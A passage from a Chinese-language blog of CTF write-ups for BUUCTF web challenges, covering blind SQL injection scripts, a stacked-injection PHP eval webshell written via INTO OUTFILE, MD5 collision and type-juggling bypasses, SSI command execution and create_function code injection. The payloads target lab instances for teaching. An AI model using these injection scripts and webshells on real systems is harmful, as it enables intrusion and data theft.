sec) 用上面的知识再结合16进制编码，这样就可以绕过对一些关键字(select,from之类的)的过滤。 比如： 回到题目，注册成功后登陆查看资料，发现url如下： http://87e3250e-37a7-472a-b4e3-764ad942514d.node3.buuoj.cn/user/user.php?id=2 id处可能有SQL注入，过滤了单引号还有一些关键字，用异或注入： 由于过滤了union，select ，&amp;，|还有一些函数，只能Get Shell才能拿到flag。 存在SQL注入的题目都可以直接load_file盲注flag。 查看secure_file_priv配置 12345678910111213141516171819202122232425262728293031import requestsimport stringimport binasciiimport timeimport sysurl = &quot;&quot;&quot;http://9ba27d3d-01fd-4c6e-8c1c-e52d69a8a150.node3.buuoj.cn/user/user.php?id=&quot;&quot;&quot;r = requests.session()cookies = &#123; &quot;PHPSESSID&quot;: &quot;o5lhvid6588d0rgkgieh1vne75&quot;&#125;char = string.ascii_lowercase + string.digits + &#x27;/&#x27;payload = &quot;2-(@@secure_file_priv&lt;BINARY(0x&#123;0&#125;))&quot;flag = &quot;&quot;data = &quot;&quot;hex = lambda s: binascii.b2a_hex(s.encode(&quot;utf-8&quot;)).decode(&quot;utf-8&quot;)for _ in range(50): for i in range(33, 128): c = chr(i) time.sleep(0.3) _url = url + payload.format(flag+hex(c)) res = r.get(url=_url, cookies=cookies) # print(res.text) if &#x27;admin&#x27; in res.text: data += chr(i-1) flag += hex(chr(i-1)) print(data) breakprint(data) 盲注出secure_file_priv=/var/www/ 使用load_file函数读取index.php文件/var/www/html/index.php 1234567891011121314151617181920import requestsurl = &quot;&quot;&quot;http://9ba27d3d-01fd-4c6e-8c1c-e52d69a8a150.node3.buuoj.cn/user/user.php?id=&quot;&quot;&quot;cookies = &#123; &quot;PHPSESSID&quot;:&quot;fg4kp97ksielnvnssv53iul2s6&quot;&#125;data=&#x27;0x&#x27;flag=&#x27;&#x27;r=requests.session()for i in range(9999): for i in range(32,127): _url = url + &#x27;^(hex(load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870))&lt;&#x27;+data+str(hex(i)).replace(&#x27;0x&#x27;,&#x27;&#x27;)+&#x27;)&#x27; result=r.get(url=url,cookies=cookies) if &#x27;admin&#x27; in result.text: data+=str(hex(i-1)).replace(&#x27;0x&#x27;,&#x27;&#x27;) flag+=(chr(i-1)) print (flag) breakprint(data) 发现包含了bwvs_config/config.php和waf.php 12345function waf($str)&#123; $black_str = &quot;/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i&quot;; $str = preg_replace($black_str, &quot;@@&quot;,$str); return addslashes($str); &#125; user.php 12345678if(isset($_GET[&#x27;id&#x27;]))&#123; $id=waf($_GET[&#x27;id&#x27;]); $sql = &quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_id =&quot;.$id; $data = mysqli_multi_query($connect,$sql) or die(); $result = mysqli_store_result($connect); $row = mysqli_fetch_row($result); echo &#x27;&lt;h1&gt;user_id:&#x27;.$row[0].&quot;&lt;/h1&gt;&lt;br&gt;&lt;h2&gt;user_name:&quot;.$row[1].&quot;&lt;/h2&gt;&lt;br&gt;&lt;h3&gt;注册时间：&quot;.$row[4].&quot;&lt;/h3&gt;&quot;; 既然有mysqli_multi_query，就会存在堆叠注入，使用上面提到的MySQL预编译来绕过select的限制。 利用堆叠注入像头像上传的位置写入shell 1SELECT &#39;&lt;?php @eval($_POST[a]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon&#x2F;shell.php&#39; 1set @xx&#x3D;0x53454c45435420273c3f70687020406576616c28245f504f53545b615d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f7368656c6c2e70687027;prepare x from @xx;execute x; PwnThyBytes2019 Baby_SQL October 2019 Twice SQL Injection HITCON 2017 SQL So Hard","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"SQL注入","slug":"CTF/SQL注入","permalink":"http://ca0y1h.top/categories/CTF/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"buuctf刷题——PHP代码审计","date":"2020-08-18T09:57:57.000Z","path":"Web_security/ctf_writeup/4.buuctf刷题——PHP代码审计/","text":"BUUCTF刷题——PHP代码审计 [HCTF2018]WarmingUp 考点 代码审计 解题 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; https://www.cnblogs.com/h3zh1/p/12853478.html payload： 1http:&#x2F;&#x2F;f3a0386f-ebf6-4b35-8a60-87de301e158a.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg 我感觉上面这个分析有点问题，这个payload到了第23行的if语句就直接return，没有后面的代码啥事了。 [极客大挑战2019]PHP TODO BJDCTF2020 Easy MD5 考点 PHP MD5 解题 第一关 payload：ffifdyop 分析文章：https://blog.csdn.net/March97/article/details/81222922?utm_source=blogxgwz9 123content: ffifdyophex: 276f722736c95d99e921722cf9ed621craw: &#39;or&#39;6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c 在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。 第二关 MD5 碰撞 第三关 123456789&lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123; echo $flag;&#125; 为MD5强类型比较，这时候传入两个数组，数组的值不相等，造成MD5加密时报错产生NULL=NULL的情况，绕过比较。 拓展 1234if((string)$_POST[&#x27;param1&#x27;]!==(string)$_POST[&#x27;param2&#x27;] &amp;&amp; md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123; die(&quot;success!&quot;);&#125; https://xz.aliyun.com/t/2232 1param1&#x3D;1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02Sj%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3E%D6%D1mE%AAL4%E1%F2d%CD%E1%073c%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F_D%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%3C%F9%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%90%BC%B5%2F%ED&amp;param2&#x3D;1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02S%EA%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3EV%D2mE%AAL4%E1%F2d%CD%E1%073%E3%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F%DFD%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%BC%F8%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%10%BC%B5%2F%ED MRCTF2020 Ez_bypass 考点 MD5绕过 is_numeric绕过 解题 123456789101112131415161718192021222324252627282930313233343536373839include &#x27;flag.php&#x27;;$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123; $id=$_GET[&#x27;id&#x27;]; $gg=$_GET[&#x27;gg&#x27;]; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123; echo &#x27;You got the first step&#x27;; if(isset($_POST[&#x27;passwd&#x27;])) &#123; $passwd=$_POST[&#x27;passwd&#x27;]; if (!is_numeric($passwd)) &#123; if($passwd==1234567) &#123; echo &#x27;Good Job!&#x27;; highlight_file(&#x27;flag.php&#x27;); die(&#x27;By Retr_0&#x27;); &#125; else &#123; echo &quot;can you think twice??&quot;; &#125; &#125; else&#123; echo &#x27;You can not get it !&#x27;; &#125; &#125; else&#123; die(&#x27;only one way to get the flag&#x27;); &#125;&#125; else &#123; echo &quot;You are not a real hacker!&quot;; &#125;&#125;else&#123; die(&#x27;Please input first&#x27;);&#125;&#125; 比较简单的一道题。 第一个为MD5强类型比较，这时候传入两个数组，数组的值不相等，造成MD5加密时报错产生NULL=NULL的情况，绕过比较。 第二个为is_numeric函数弱类型，用1234567abc绕过。 BJDCTF2020 Mark loves cat 考点 Git源码泄露 变量覆盖 解题 关键在于要认识到exit()也是可以是输出的 12345678910111213141516171819202122232425262728293031&lt;?phpinclude &#x27;flag.php&#x27;;$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = &#x27;yds&#x27;;foreach($_POST as $x =&gt; $y)&#123; $$x = $y;&#125;foreach($_GET as $x =&gt; $y)&#123; $$x = $$y;&#125;foreach($_GET as $x =&gt; $y)&#123; if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123; exit($handsome); &#125;&#125;if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123; exit($yds);&#125;if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27; || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123; exit($is);&#125;echo &quot;the flag is: &quot;.$flag; 先来分析三个if语句： 第一个if语句： 12345foreach($_GET as $x =&gt; $y)&#123; if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123; exit($handsome); &#125;&#125; 键名为flag的键值绝对等于其中某一个键值，并且键名不能有flag。前后相互矛盾，进不去这个判断。 第二个if语句： 123if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123; exit($yds);&#125; 不存在GET型的flag参数，也不存在POST型的flag参数。 第三个if语句： 123if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27; || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123; exit($is);&#125; POST型flag参数值绝对等于flag，GET型flag参数值绝对等于flag。 如果想通过第二个if语句来输出flag的话，就要去覆盖$flag，即$yds=$flag： 123foreach($_GET as $x =&gt; $y)&#123; $$x = $$y;&#125; 那么就可以直接GET传参： 1&#x2F;index.php?yds&#x3D;flag 相当于$yds=$flag。 如果想通过第三个if语句来输出flag，就要去覆盖$is，即$is=$flag，并且GET中要有flag参数： 1&#x2F;index.php?is&#x3D;flag&amp;flag&#x3D;flag GKCTF2020 CheckIN 考点 disable_function绕过 解题 12345678910111213141516171819&lt;?php highlight_file(__FILE__);class ClassName&#123; public $code = null; public $decode = null; function __construct() &#123; $this-&gt;code = @$this-&gt;x()[&#x27;Ginkgo&#x27;]; $this-&gt;decode = @base64_decode( $this-&gt;code ); @Eval($this-&gt;decode); &#125; public function x() &#123; return $_REQUEST; &#125;&#125;new ClassName(); 看一下phpinfo，发现禁用了很多执行系统命令的函数。 写一个shell用蚁剑连接，eval($_POST[123]);，经过base64编码是ZXZhbCgkX1BPU1RbMTIzXSk7 浏览根目录发现要用readflag读取flag文件，上传php7-diable_function-bypass Poc至/tmp目录下，然后用include包含该文件： GWCTF2019 枯燥的抽奖 考点 解题 查看源代码有一段JS代码 123456789101112131415161718192021222324252627282930313233343536$(document).ready(function()&#123; $(&quot;#div1&quot;).load(&quot;check.php #p1&quot;); $(&quot;.close&quot;).click(function()&#123; $(&quot;#myAlert&quot;).hide(); &#125;); $(&quot;#button1&quot;).click(function()&#123; $(&quot;#myAlert&quot;).hide(); guess=$(&quot;input&quot;).val(); $.ajax(&#123; type: &quot;POST&quot;, url: &quot;check.php&quot;, data: &quot;num=&quot;+guess, success: function(msg)&#123; $(&quot;#div2&quot;).append(msg); alertmsg = $(&quot;#flag&quot;).text(); if(alertmsg==&quot;没抽中哦，再试试吧&quot;)&#123; $(&quot;#myAlert&quot;).attr(&quot;class&quot;,&quot;alert alert-warning&quot;); if($(&quot;#new&quot;).text()==&quot;&quot;) $(&quot;#new&quot;).append(alertmsg); &#125; else&#123; $(&quot;#myAlert&quot;).attr(&quot;class&quot;,&quot;alert alert-success&quot;); if($(&quot;#new&quot;).text()==&quot;&quot;) $(&quot;#new&quot;).append(alertmsg); &#125; &#125; &#125;); $(&quot;#myAlert&quot;).show(); $(&quot;#new&quot;).empty(); $(&quot;#div2&quot;).empty(); &#125;);&#125;); 再去看check.php 1234567891011121314151617181920212223242526272829ODuHdhCHWY&lt;?php#这不是抽奖程序的源代码！不许看！header(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();if(!isset($_SESSION[&#x27;seed&#x27;]))&#123;$_SESSION[&#x27;seed&#x27;]=rand(0,999999999);&#125;mt_srand($_SESSION[&#x27;seed&#x27;]);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&#x27;&#x27;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123; $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125;$str_show = substr($str, 0, 10);echo &quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;if(isset($_POST[&#x27;num&#x27;]))&#123; if($_POST[&#x27;num&#x27;]===$str)&#123;x echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;; &#125; else&#123; echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;; &#125;&#125;show_source(&quot;check.php&quot;); BJDCTF2020 EasySearch 考点 MD5截断验证 解题 用dirmap扫一遍，发现index.php.swp 123456789101112131415161718192021222324252627282930313233343536&lt;?php ob_start(); function get_hash()&#123; $chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); &#125; header(&quot;Content-Type: text/html;charset=utf-8&quot;); *** if(isset($_POST[&#x27;username&#x27;]) and $_POST[&#x27;username&#x27;] != &#x27;&#x27; ) &#123; $admin = &#x27;6d0bc1&#x27;; if ( $admin == substr(md5($_POST[&#x27;password&#x27;]),0,6)) &#123; echo &quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;; $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;; $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;); $text = &#x27; *** *** &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt; *** ***&#x27;; fwrite($shtml,$text); fclose($shtml); *** echo &quot;[!] Header error ...&quot;; &#125; else &#123; echo &quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;; &#125;else &#123; *** &#125; ***?&gt; 代码第14行明显是考察MD5截断认证，直接用脚本爆破 参考：https://www.cnblogs.com/yesec/p/11297568.html 12345678910111213141516171819202122from multiprocessing.dummy import Pool as tpimport hashlibknownMd5 = &#x27;6d0bc1&#x27; #已知的md5明文def md5(text): return hashlib.md5(str(text).encode(&#x27;utf-8&#x27;)).hexdigest()def findCode(code): key = code.split(&#x27;:&#x27;) start = int(key[0]) end = int(key[1]) for code in range(start, end): if md5(code)[0:6] == knownMd5: print code breaklist=[] for i in range(3): #这里的range(number)指爆破出多少结果停止 list.append(str(10000000*i) + &#x27;:&#x27; + str(10000000*(i+1)))pool = tp() #使用多线程加快爆破速度pool.map(findCode, list) pool.close()pool.join() 得到password:2020666 然后以admin，2020666登录，在header中发现随机生成的文件所在路径。访问之，发现界面为： 看到这个admin猜测肯定有模板注入，但是用&#123;&#123;7*'7'&#125;&#125;验证一直返回fail，查阅wp得知是SSI注入（我之前都没听过）。 可以通过public文件夹下的文件后缀名.shtml得到线索 参考文章 在username设置&lt;!--#exec cmd=&quot;命令&quot;--&gt; ，即可执行命令。 拓展 另一种形式的MD5截断验证： https://www.cnblogs.com/yesec/p/11300841.html MRCTF2020 套娃 考点 $_SERVER['QUERY_STRING']绕过 代码审计 解题 第一层 123456789//1st$query = $_SERVER[&#x27;QUERY_STRING&#x27;]; if( substr_count($query, &#x27;_&#x27;) !== 0 || substr_count($query, &#x27;%5f&#x27;) != 0 )&#123; die(&#x27;Y0u are So cutE!&#x27;);&#125; if($_GET[&#x27;b_u_p_t&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;]))&#123; echo &quot;you are going to the next ~&quot;;&#125; 题外话：$_SERVER['QUERY_STRING']不会进行URLDecode，而$_GET[]会将参数进行URLDecode 利用PHP的字符串解析特性Bypass第一个if语句。 参考文章：https://www.freebuf.com/articles/web/213359.html 第二个if中正则匹配表示匹配字符串的开头和结尾，由于在字符串中换行可以表示字符串的结尾，所以可以用%0a绕过。 参考文章：https://www.cnblogs.com/20175211lyz/p/12198258.html 所以第一层的payload就是 1?b%20u%20p%20t&#x3D;23333%0a 第二层 查看源代码，有一大串的JSFuck编码，直接拿到console跑 提示需要POST一下Merak数据，内容任意。继续审计代码 12345678910111213141516171819202122232425262728&lt;?php error_reporting(0); include &#x27;takeip.php&#x27;;ini_set(&#x27;open_basedir&#x27;,&#x27;.&#x27;); include &#x27;flag.php&#x27;;if(isset($_POST[&#x27;Merak&#x27;]))&#123; highlight_file(__FILE__); die(); &#125; function change($v)&#123; $v = base64_decode($v); $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) + $i*2 ); &#125; return $re; &#125;echo &#x27;Local access only!&#x27;.&quot;&lt;br/&gt;&quot;;$ip = getIp();if($ip!=&#x27;127.0.0.1&#x27;)echo &quot;Sorry,you don&#x27;t have permission! Your ip is :&quot;.$ip;if($ip === &#x27;127.0.0.1&#x27; &amp;&amp; file_get_contents($_GET[&#x27;2333&#x27;]) === &#x27;todat is a happy day&#x27; )&#123;echo &quot;Your REQUEST is:&quot;.change($_GET[&#x27;file&#x27;]);echo file_get_contents(change($_GET[&#x27;file&#x27;])); &#125;?&gt; 只允许本地登录，那么就加上Client-IP:127.0.0.1的Header。接着使用data伪协议从2333参数中读取todat is a happy day。 接下来就是逆向change函数， 1234567891011&lt;?phpfunction unchange($v)&#123; $re = &#x27;&#x27;; for ($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr(ord($v[$i]) - $i*2); &#125; return $re;&#125;$real = unchange(&quot;flag.php&quot;);echo base64_encode($real); 所以第二层的payload就是： 1?2333&#x3D;data:text&#x2F;plain,tadat is a happy day&amp;file&#x3D;ZmpdYSZmXGI&#x3D; [Zer0pts2020]Can you guess it? 考点 $_SEVER['PHP_SELF']利用 basename()绕过 解题 利用点在: 1234if (isset($_GET[&#39;source&#39;])) &#123; highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;])); exit();&#125; 但是前面还有过滤： 123if (preg_match(&#39;&#x2F;config\\.php\\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123; exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);&#125; 其中$_SERVER['PHP_SELF']我们知道它的值是url相对路径。也就是说我们输入/index.php/config.php?source 会返回/index.php/config.php 我们知道preg_match 是需要完全匹配才会返回true的，也就是说我们输入/index.php/config.php/a就可以绕过，但是basename的结果会是a显然会报错，因为没这个文件。此时我们想到了basename会忽略一些奇怪的字符%80 ~ %ff。 所以我们输入/index.php/comfig.php/%ff 就可以进行显示comfig.php文件，这里所有的操作都是在index.php下进行的（我们看到的代码都是index.php的代码）。当然我们不要忘记传get的变量source。 payload：/index.php/config.php/%81?source [BJDCTF2020]EzPHP 考点 QUERY_STRING绕过 SHA1数组绕过 preg_match数组绕过 extract变量覆盖 create_function注入 解题 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phphighlight_file(__FILE__);error_reporting(0); $file = &quot;1nD3x.php&quot;;$shana = $_GET[&#x27;shana&#x27;];$passwd = $_GET[&#x27;passwd&#x27;];$arg = &#x27;&#x27;;$code = &#x27;&#x27;;echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;if($_SERVER) &#123; if ( preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;]) ) die(&#x27;You seem to want to do something bad?&#x27;); &#125;if (!preg_match(&#x27;/http|https/i&#x27;, $_GET[&#x27;file&#x27;])) &#123; if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; $file = $_GET[&quot;file&quot;]; echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;; &#125; &#125; else die(&#x27;fxck you! What do you want to do ?!&#x27;);if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123; if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value)) die(&#x27;fxck you! I hate English!&#x27;); &#125; &#125; if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;) die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;);if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123; extract($_GET[&quot;flag&quot;]); echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123; die(&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;);&#125;if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#x27;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i&#x27;, $arg) ) &#123; die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); &#125; else &#123; include &quot;flag.php&quot;; $code(&#x27;&#x27;, $arg); &#125; ?&gt; $_SERVER[‘QUERY_STRING’]绕过 需要明确一个知识点： $_SERVER['QUERY_STRING']返回url中查询的字符串，与此类似的还有： $_SERVER['REQUEST_URI']返回访问此页面所需的URI $_SERVER['SCRIPT_NAME']返回包含当前脚本的路径 $_SERVER['PHP_SELF']当前正在执行脚本的文件名 举个例子：(浏览器自动将file的url编码解码了) 可以看到，$_SERVER['QUERY_STRING']和$_SERVER['REQUEST_URI']在传输时不会url解码，而$_GET,$_POST会url解码，因此我们可以url编码绕过下面代码： 123456if($_SERVER) &#123; if ( preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;]) ) die(&#x27;You seem to want to do something bad?&#x27;); &#125; preg_match换行符绕过 123456if (!preg_match(&#x27;/http|https/i&#x27;, $_GET[&#x27;file&#x27;])) &#123; if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; $file = $_GET[&quot;file&quot;]; echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;; &#125; &#125; else die(&#x27;fxck you! What do you want to do ?!&#x27;); 由于没有/s修饰符用来在匹配时匹配换行符，我们可以使用%0a换行污染绕过。 $_REQUEST字母匹配绕过 123456if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123; if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value)) die(&#x27;fxck you! I hate English!&#x27;); &#125; &#125; $_REQUEST包含_POST、_GET和COOKIE三个全局变量，并且POST具有更高的优先值，也就是说我们可以POST同样名称满足条件的值，比如数字就可以绕过这个匹配。另外，数组类型的数据不需要POST，preg_match()只能匹配字符串，数组得以绕过。 我在BUUOJ上面做这个题的时候，一直绕不过这个字母匹配，再仔细一看，发现是buu自带的cookie的原因，删掉即可。 file_get_contents比对绕过 12if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;) die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;); 刚开始想的是php://input，后来发现要POST数据，因此便不能用了，这里可以用data://，示例： 12data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D; sha1比较 123456if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123; extract($_GET[&quot;flag&quot;]); echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123; die(&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;);&#125; 直接数组绕过。 extract变量覆盖 因为extract()函数使用数组键名作为变量名，使用数组键值作为变量值，针对数组中的每个元素，将在当前符号表中创建对应的一个变量，所以这里我们可以传数组，即flag[code]和flag[arg]的形式。 create_function代码注入 1234567if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#x27;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i&#x27;, $arg) ) &#123; die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); &#125; else &#123; include &quot;flag.php&quot;; $code(&#x27;&#x27;, $arg); &#125; 基本的注入形式： 12&lt;?php$myFunc = create_function(&#x27;$a, $b&#x27;, &#x27;return($a+$b);&#125;eval($_POST[1]);\\\\&#x27;); 执行时相当于： 1234function myFunc($a, $b)&#123; return $a+$b;&#125;eval($_POST[1]);//&#125; 那么这道题禁用了很多类似无参数RCE的函数关键字，也禁用了很多读文件的系统命令。 但是代码中已经包含了flag.php，那么就可以使用里面的变量。所以要想办法在不指定变量名称的情况下输出变量的值，可以想到：是否存在一个函数，能输出所有变量的值？ 答案是get_defined_vars()用来输出所有变量和值。 那么整体的payload就是 